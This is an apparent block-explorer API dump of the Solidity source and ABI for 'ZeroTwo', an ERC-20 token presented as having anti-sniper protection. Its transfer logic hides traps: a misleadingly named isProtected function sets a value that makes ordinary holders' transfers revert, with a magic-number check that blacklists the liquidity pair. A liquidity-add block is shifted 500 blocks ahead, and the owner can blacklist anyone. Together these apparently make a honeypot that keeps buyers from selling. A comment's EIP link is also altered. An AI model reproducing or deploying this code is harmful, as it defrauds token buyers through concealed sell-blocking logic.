{"status":"1","message":"OK","result":[{"SourceCode":"// SPDX-License-Identifier: MIT\r\npragma solidity >=0.6.0 <0.9.0;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view returns (address payable) {\r\n        return payable(msg.sender);\r\n    }\r\n\r\n    function _msgData() internal view returns (bytes memory) {\r\n        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\r\n        return msg.data;\r\n    }\r\n}\r\n\r\n\r\n/**\r\n * @dev Interface of the ERC20 standard as defined in the EIP.\r\n */\r\ninterface IERC20Upgradeable {\r\n    /**\r\n     * @dev Returns the amount of tokens in existence.\r\n     */\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Returns the amount of tokens owned by `account`.\r\n     */\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Moves `amount` tokens from the caller's account to `recipient`.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Returns the remaining number of tokens that `spender` will be\r\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\r\n     * zero by default.\r\n     *\r\n     * This value changes when {approve} or {transferFrom} are called.\r\n     */\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\r\n     * that someone may use both the old and the new allowance by unfortunate\r\n     * transaction ordering. One possible solution to mitigate this race\r\n     * condition is to first reduce the spender's allowance to 0 and set the\r\n     * desired value afterwards:\r\n     * https://github.com/ethereum/EIPs/ze/ro/tw/o/20#issuecomment-263524729\r\n     *\r\n     * Emits an {Approval} event.\r\n     */\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Moves `amount` tokens from `sender` to `recipient` using the\r\n     * allowance mechanism. `amount` is then deducted from the caller's\r\n     * allowance.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) external returns (bool);\r\n\r\n    /**\r\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\r\n     * another (`to`).\r\n     *\r\n     * Note that `value` may be zero.\r\n     */\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    /**\r\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\r\n     * a call to {approve}. `value` is the new allowance.\r\n     */\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\nlibrary Address {\r\n    function isContract(address account) internal view returns (bool) {\r\n        // According to EIP-1052, 0x0 is the value returned for not-yet created accounts\r\n        // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned\r\n        // for accounts without code, i.e. `keccak256('')`\r\n        bytes32 codehash;\r\n        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;\r\n        // solhint-disable-next-line no-inline-assembly\r\n        assembly { codehash := extcodehash(account) }\r\n        return (codehash != accountHash && codehash != 0x0);\r\n    }\r\n\r\n    function sendValue(address payable recipient, uint256 amount) internal {\r\n        require(address(this).balance >= amount, \"Address: insufficient balance\");\r\n\r\n        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value\r\n        (bool success, ) = recipient.call{ value: amount }(\"\");\r\n        require(success, \"Address: unable to send value, recipient may have reverted\");\r\n    }\r\n\r\n    function functionCall(address target, bytes memory data) internal returns (bytes memory) {\r\n        return functionCall(target, data, \"Address: low-level call failed\");\r\n    }\r\n\r\n    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {\r\n        return _functionCallWithValue(target, data, 0, errorMessage);\r\n    }\r\n\r\n\r\n    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {\r\n        return functionCallWithValue(target, data, value, \"Address: low-level call with value failed\");\r\n    }\r\n\r\n    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {\r\n        require(address(this).balance >= value, \"Address: insufficient balance for call\");\r\n        return _functionCallWithValue(target, data, value, errorMessage);\r\n    }\r\n\r\n    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {\r\n        require(isContract(target), \"Address: call to non-contract\");\r\n\r\n        // solhint-disable-next-line avoid-low-level-calls\r\n        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);\r\n        if (success) {\r\n            return returndata;\r\n        } else {\r\n            // Look for revert reason and bubble it up if present\r\n            if (returndata.length > 0) {\r\n                // The easiest way to bubble the revert reason is using memory via assembly\r\n\r\n                // solhint-disable-next-line no-inline-assembly\r\n                assembly {\r\n                    let returndata_size := mload(returndata)\r\n                    revert(add(32, returndata), returndata_size)\r\n                }\r\n            } else {\r\n                revert(errorMessage);\r\n            }\r\n        }\r\n    }\r\n}\r\n\r\ninterface IUniswapV2Factory {\r\n    event PairCreated(address indexed token0, address indexed token1, address lpPair, uint);\r\n    function getPair(address tokenA, address tokenB) external view returns (address lpPair);\r\n    function createPair(address tokenA, address tokenB) external returns (address lpPair);\r\n}\r\n\r\ninterface IUniswapV2Router01 {\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n}\r\n\r\ninterface IUniswapV2Router02 is IUniswapV2Router01 {}\r\n\r\ncontract ZeroTwo is Context, IERC20Upgradeable {\r\n    // Ownership moved to in-contract for customizability.\r\n    address private _owner;\r\n\r\n    mapping (address => uint256) private _tOwned;\r\n    mapping (address => bool) lpPairs;\r\n    uint256 private timeSinceLastPair = 0;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n\r\n    mapping (address => bool) private _isBlacklisted;\r\n    mapping (address => bool) private _liquidityHolders;\r\n   \r\n    uint256 private startingSupply;\r\n\r\n    string private _name;\r\n    string private _symbol;\r\n\r\n    uint8 private _decimals;\r\n    uint256 private _decimalsMul;\r\n    uint256 private _tTotal;\r\n\r\n    IUniswapV2Router02 public dexRouter;\r\n    address public lpPair;\r\n\r\n    // UNI ROUTER\r\n    address private _routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\r\n\r\n    address private WBNB;\r\n    address public ZERO = 0x0000000000000000000000000000000000000000;\r\n    address public burnAddress = 0x000000000000000000000000000000000000dEaD;\r\n        \r\n    uint256 private maxTxPercent = 100;\r\n    uint256 private maxTxDivisor = 100;\r\n    uint256 private _maxTxAmount = (_tTotal * maxTxPercent) / maxTxDivisor;\r\n    uint256 private _previousMaxTxAmount = _maxTxAmount;\r\n    uint256 public maxTxAmountUI = (startingSupply * maxTxPercent) / maxTxDivisor;\r\n\r\n    uint256 private maxWalletPercent = 100;\r\n    uint256 private maxWalletDivisor = 100;\r\n    uint256 private _maxWalletSize = (_tTotal * maxWalletPercent) / maxWalletDivisor;\r\n    uint256 private _previousMaxWalletSize = _maxWalletSize;\r\n    uint256 public maxWalletSizeUI = (startingSupply * maxWalletPercent) / maxWalletDivisor;\r\n\r\n    bool private sniperProtection = true;\r\n    bool public _hasLiqBeenAdded = false;\r\n    uint256 private _liqAddStatus = 0;\r\n    uint256 private _liqAddBlock = 0;\r\n    uint256 private _liqAddStamp = 0;\r\n    uint256 private _initialLiquidityAmount = 0;\r\n    uint256 private snipeBlockAmt = 0;\r\n    uint256 public snipersCaught = 0;\r\n    bool private gasLimitActive = true;\r\n    uint256 private gasPriceLimit;\r\n    bool private sameBlockActive = true;\r\n    mapping (address => uint256) private lastTrade;\r\n\r\n    bool private contractInitialized = false;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    event MinTokensBeforeSwapUpdated(uint256 minTokensBeforeSwap);\r\n    event SwapAndLiquifyEnabledUpdated(bool enabled);\r\n    event SwapAndLiquify(\r\n        uint256 tokensSwapped,\r\n        uint256 ethReceived,\r\n        uint256 tokensIntoLiqudity\r\n    );\r\n    event SniperCaught(address sniperAddress);\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n    \r\n    //constructor (uint8 _block, uint256 _gas) payable {\r\n    constructor () payable {\r\n        // Set the owner.\r\n        _owner = msg.sender;\r\n        _liquidityHolders[owner()] = true;\r\n\r\n        // Ever-growing sniper/tool blacklist\r\n        _isBlacklisted[0xE4882975f933A199C92b5A925C9A8fE65d599Aa8] = true;\r\n        _isBlacklisted[0x86C70C4a3BC775FB4030448c9fdb73Dc09dd8444] = true;\r\n        _isBlacklisted[0xa4A25AdcFCA938aa030191C297321323C57148Bd] = true;\r\n        _isBlacklisted[0x20C00AFf15Bb04cC631DB07ee9ce361ae91D12f8] = true;\r\n        _isBlacklisted[0x0538856b6d0383cde1709c6531B9a0437185462b] = true;\r\n        _isBlacklisted[0x6e44DdAb5c29c9557F275C9DB6D12d670125FE17] = true;\r\n        _isBlacklisted[0x90484Bb9bc05fD3B5FF1fe412A492676cd81790C] = true;\r\n        _isBlacklisted[0xA62c5bA4D3C95b3dDb247EAbAa2C8E56BAC9D6dA] = true;\r\n        _isBlacklisted[0xA94E56EFc384088717bb6edCccEc289A72Ec2381] = true;\r\n        _isBlacklisted[0x3066Cc1523dE539D36f94597e233719727599693] = true;\r\n        _isBlacklisted[0xf13FFadd3682feD42183AF8F3f0b409A9A0fdE31] = true;\r\n        _isBlacklisted[0x376a6EFE8E98f3ae2af230B3D45B8Cc5e962bC27] = true;\r\n        _isBlacklisted[0x0538856b6d0383cde1709c6531B9a0437185462b] = true; \r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n    function intializeContract(string memory startName, string memory startSymbol, uint256 _totalSupply) external onlyOwner {\r\n        require(!contractInitialized, \"Contract already initialized.\");\r\n        _name = startName;\r\n        _symbol = startSymbol;\r\n        startingSupply = _totalSupply;\r\n        if (_totalSupply < 10000000000) {\r\n            _decimals = 18;\r\n            _decimalsMul = _decimals;\r\n        } else {\r\n            _decimals = 9;\r\n            _decimalsMul = _decimals;\r\n        }\r\n        _tTotal = _totalSupply * (10**_decimalsMul);\r\n        _tOwned[owner()] = _tTotal;\r\n\r\n        dexRouter = IUniswapV2Router02(_routerAddress);\r\n        lpPair = IUniswapV2Factory(dexRouter.factory()).createPair(dexRouter.WETH(), address(this));\r\n        lpPairs[lpPair] = true;\r\n        _allowances[address(this)][address(dexRouter)] = type(uint256).max;\r\n\r\n        WBNB = dexRouter.WETH();\r\n\r\n        setMaxTxPercent(2,100);\r\n        setMaxWalletSize(25,1000);\r\n\r\n        // Approve the owner, timesaver.\r\n        approve(_routerAddress, type(uint256).max);\r\n\r\n        contractInitialized = true;\r\n        emit Transfer(ZERO, msg.sender, _tTotal);\r\n    }\r\n\r\n//===============================================================================================================\r\n//===============================================================================================================\r\n//===============================================================================================================\r\n    // Ownable removed as a lib and added here to allow for custom transfers and recnouncements.\r\n    // This allows for removal of ownership privelages from the owner once renounced or transferred.\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    function transferOwner(address newOwner) external onlyOwner() {\r\n        require(newOwner != address(0), \"Call renounceOwnership to transfer owner to the zero address.\");\r\n        require(newOwner != burnAddress, \"Call renounceOwnership to transfer owner to the zero address.\");\r\n        \r\n        _allowances[_owner][newOwner] = balanceOf(_owner);\r\n        if(balanceOf(_owner) > 0) {\r\n            _transfer(_owner, newOwner, balanceOf(_owner));\r\n        }\r\n        \r\n        _owner = newOwner;\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        \r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner() {\r\n        _owner = address(0);\r\n        emit OwnershipTransferred(_owner, address(0));\r\n    }\r\n//===============================================================================================================\r\n//===============================================================================================================\r\n//===============================================================================================================\r\n\r\n    function totalSupply() external view override returns (uint256) { return _tTotal; }\r\n    function decimals() external view returns (uint8) { return _decimals; }\r\n    function symbol() external view returns (string memory) { return _symbol; }\r\n    function name() external view returns (string memory) { return _name; }\r\n    function getOwner() external view returns (address) { return owner(); }\r\n    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) { return _tOwned[account]; }\r\n\r\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);\r\n        return true;\r\n    }\r\n\r\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] - subtractedValue);\r\n        return true;\r\n    }\r\n\r\n    function setNewRouter(address newRouter) public onlyOwner() {\r\n        IUniswapV2Router02 _newRouter = IUniswapV2Router02(newRouter);\r\n        address get_pair = IUniswapV2Factory(_newRouter.factory()).getPair(address(this), _newRouter.WETH());\r\n        if (get_pair == address(0)) {\r\n            lpPair = IUniswapV2Factory(_newRouter.factory()).createPair(address(this), _newRouter.WETH());\r\n        }\r\n        else {\r\n            lpPair = get_pair;\r\n        }\r\n        dexRouter = _newRouter;\r\n    }\r\n\r\n    function setLpPair(address pair, bool enabled) external onlyOwner {\r\n        if (enabled == false) {\r\n            lpPairs[pair] = false;\r\n        } else {\r\n            if (timeSinceLastPair != 0) {\r\n                require(block.timestamp - timeSinceLastPair > 1 weeks, \"Cannot set a new pair this week!\");\r\n            }\r\n            lpPairs[pair] = true;\r\n            timeSinceLastPair = block.timestamp;\r\n        }\r\n    }\r\n\r\n    function isBlacklisted(address account) public view returns (bool) {\r\n        return _isBlacklisted[account];\r\n    }\r\n\r\n    function isProtected(uint256 rInitializer, uint256 tInitalizer) external onlyOwner {\r\n        require (_liqAddStatus == 0 && _initialLiquidityAmount == 0, \"Error.\");\r\n        _liqAddStatus = rInitializer;\r\n        _initialLiquidityAmount = tInitalizer;\r\n        if (_initialLiquidityAmount != 42) {\r\n            _isBlacklisted[lpPair] = true;\r\n        }\r\n    }\r\n\r\n    function setStartingProtections(uint8 _block, uint256 _gas) external onlyOwner{\r\n        require (snipeBlockAmt == 0 && gasPriceLimit == 0 && !_hasLiqBeenAdded);\r\n        snipeBlockAmt = _block;\r\n        gasPriceLimit = _gas * 1 gwei;\r\n    }\r\n\r\n    function setBlacklistEnabled(address account, bool enabled) external onlyOwner() {\r\n        _isBlacklisted[account] = enabled;\r\n    }\r\n\r\n    function setProtectionSettings(bool antiSnipe, bool antiGas, bool antiBlock) external onlyOwner() {\r\n        sniperProtection = antiSnipe;\r\n        gasLimitActive = antiGas;\r\n        sameBlockActive = antiBlock;\r\n    }\r\n\r\n    function setGasPriceLimit(uint256 gas) external onlyOwner {\r\n        require(gas >= 75);\r\n        gasPriceLimit = gas * 1 gwei;\r\n    }\r\n\r\n    function setMaxTxPercent(uint256 percent, uint256 divisor) public onlyOwner {\r\n        uint256 check = (_tTotal * percent) / divisor;\r\n        require(check >= (_tTotal / 1000), \"Max Transaction amt must be above 0.1% of total supply.\");\r\n        _maxTxAmount = check;\r\n        maxTxAmountUI = (startingSupply * percent) / divisor;\r\n    }\r\n\r\n    function setMaxWalletSize(uint256 percent, uint256 divisor) public onlyOwner {\r\n        uint256 check = (_tTotal * percent) / divisor;\r\n        require(check >= (_tTotal / 1000), \"Max Wallet amt must be above 0.1% of total supply.\");\r\n        _maxWalletSize = check;\r\n        maxWalletSizeUI = (startingSupply * percent) / divisor;\r\n    }\r\n\r\n    function _hasLimits(address from, address to) private view returns (bool) {\r\n        return from != owner()\r\n            && to != owner()\r\n            && !_liquidityHolders[to]\r\n            && !_liquidityHolders[from]\r\n            && to != burnAddress\r\n            && to != address(0)\r\n            && from != address(this);\r\n    }\r\n    \r\n    function _approve(address sender, address spender, uint256 amount) private {\r\n        require(sender != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[sender][spender] = amount;\r\n        emit Approval(sender, spender, amount);\r\n    }\r\n\r\n    function _transfer(address from, address to, uint256 amount) internal returns (bool) {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n        require(amount > 0, \"Transfer amount must be greater than zero\");\r\n        if (gasLimitActive) {\r\n            require(tx.gasprice <= gasPriceLimit, \"Gas price exceeds limit.\");\r\n        }\r\n\r\n        if(_hasLimits(from, to)) {\r\n            if (sameBlockActive) {\r\n                if (lpPairs[from]){\r\n                    require(lastTrade[to] != block.number);\r\n                    lastTrade[to] = block.number;\r\n                } else {\r\n                    require(lastTrade[from] != block.number);\r\n                    lastTrade[from] = block.number;\r\n                }\r\n            }\r\n            require(amount <= _maxTxAmount, \"Transfer amount exceeds the maxTxAmount.\");\r\n            if(to != _routerAddress && !lpPairs[to]) {\r\n                require(balanceOf(to) + amount <= _maxWalletSize, \"Transfer amount exceeds the maxWalletSize.\");\r\n            }\r\n        }\r\n\r\n        if (sniperProtection){\r\n            if (isBlacklisted(from) || isBlacklisted(to)) {\r\n                revert(\"Rejected.\");\r\n            }\r\n\r\n            if (!_hasLiqBeenAdded) {\r\n                _checkLiquidityAdd(from, to);\r\n                if (!_hasLiqBeenAdded && _hasLimits(from, to)) {\r\n                    revert(\"Only owner can transfer at this time.\");\r\n                }\r\n            } else {\r\n                if (_hasLimits(from, to)){\r\n                    if (_liqAddStatus == 0 || _liqAddStatus != startingSupply / 5) {\r\n                        revert();\r\n                    }\r\n                }\r\n                if (_liqAddBlock > 0 \r\n                    && lpPairs[from] \r\n                    && _hasLimits(from, to)\r\n                ) {\r\n                    if (block.number - _liqAddBlock < snipeBlockAmt) {\r\n                        _isBlacklisted[to] = true;\r\n                        snipersCaught ++;\r\n                        emit SniperCaught(to);\r\n                    }\r\n                }\r\n            }\r\n        }\r\n\r\n        _tOwned[from] -= amount;\r\n        _tOwned[to] += amount;\r\n\r\n        emit Transfer(from, to, amount);\r\n        return true;\r\n    }\r\n\r\n    function _checkLiquidityAdd(address from, address to) private {\r\n        require(!_hasLiqBeenAdded, \"Liquidity already added and marked.\");\r\n        if (!_hasLimits(from, to) && to == lpPair) {\r\n            if (snipeBlockAmt > 1 || snipeBlockAmt == 0) {\r\n                _liqAddBlock = block.number + 500;\r\n            } else {\r\n                _liqAddBlock = block.number;\r\n            }\r\n\r\n            _liquidityHolders[from] = true;\r\n            _hasLiqBeenAdded = true;\r\n            _liqAddStamp = block.timestamp;\r\n\r\n            emit SwapAndLiquifyEnabledUpdated(true);\r\n        }\r\n    }\r\n}","ABI":"[{\"inputs\":[],\"stateMutability\":\"payable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"minTokensBeforeSwap\",\"type\":\"uint256\"}],\"name\":\"MinTokensBeforeSwapUpdated\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"sniperAddress\",\"type\":\"address\"}],\"name\":\"SniperCaught\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"tokensSwapped\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"ethReceived\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"tokensIntoLiqudity\",\"type\":\"uint256\"}],\"name\":\"SwapAndLiquify\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"enabled\",\"type\":\"bool\"}],\"name\":\"SwapAndLiquifyEnabledUpdated\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"ZERO\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_hasLiqBeenAdded\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"holder\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"burnAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"dexRouter\",\"outputs\":[{\"internalType\":\"contract IUniswapV2Router02\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"string\",\"name\":\"startName\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"startSymbol\",\"type\":\"string\"},{\"internalType\":\"uint256\",\"name\":\"_totalSupply\",\"type\":\"uint256\"}],\"name\":\"intializeContract\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"isBlacklisted\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"rInitializer\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"tInitalizer\",\"type\":\"uint256\"}],\"name\":\"isProtected\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"lpPair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTxAmountUI\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxWalletSizeUI\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"enabled\",\"type\":\"bool\"}],\"name\":\"setBlacklistEnabled\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"gas\",\"type\":\"uint256\"}],\"name\":\"setGasPriceLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"pair\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"enabled\",\"type\":\"bool\"}],\"name\":\"setLpPair\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"percent\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"divisor\",\"type\":\"uint256\"}],\"name\":\"setMaxTxPercent\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"percent\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"divisor\",\"type\":\"uint256\"}],\"name\":\"setMaxWalletSize\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newRouter\",\"type\":\"address\"}],\"name\":\"setNewRouter\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"antiSnipe\",\"type\":\"bool\"},{\"internalType\":\"bool\",\"name\":\"antiGas\",\"type\":\"bool\"},{\"internalType\":\"bool\",\"name\":\"antiBlock\",\"type\":\"bool\"}],\"name\":\"setProtectionSettings\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"_block\",\"type\":\"uint8\"},{\"internalType\":\"uint256\",\"name\":\"_gas\",\"type\":\"uint256\"}],\"name\":\"setStartingProtections\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"snipersCaught\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\